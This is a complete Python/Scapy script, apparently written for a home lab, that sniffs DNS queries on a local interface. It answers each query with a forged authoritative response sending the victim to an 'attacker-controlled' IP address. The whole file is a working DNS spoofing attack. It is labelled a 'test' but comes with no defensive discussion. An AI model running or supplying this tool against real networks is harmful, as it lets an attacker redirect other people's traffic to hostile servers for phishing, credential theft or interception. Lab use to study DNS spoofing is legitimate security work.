
from scapy.all import *
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP

# Attacker-controlled IP (the fake answer target)
redirect_ip = "192.168.56.103"

# process and respond to DNS queries
def handle_dns_packet(packet):
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
        query_name = packet[DNSQR].qname.decode().rstrip('.')
        print(f"[+] Intercepted DNS request for: {query_name}")

        # spoofed DNS response
        spoofed_pkt = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                      UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                      DNS(
                          id=packet[DNS].id,
                          qr=1,
                          aa=1,
                          qd=packet[DNS].qd,
                          an=DNSRR(rrname=packet[DNSQR].qname, rdata=redirect_ip)
                      )

        send(spoofed_pkt, verbose=False)
        print(f"[+] Sent spoofed DNS response to {packet[IP].src}")

# test 
if __name__ == "__main__":
    interface = "enp0s3"  # Your network interface

    print("[*] Starting DNS spoof test. Press CTRL+C to stop.")
    try:
        sniff(
            filter="udp port 53",
            iface=interface,
            prn=handle_dns_packet,
            store=0
        )
    except KeyboardInterrupt:
        print("\n[!] Test stopped.")
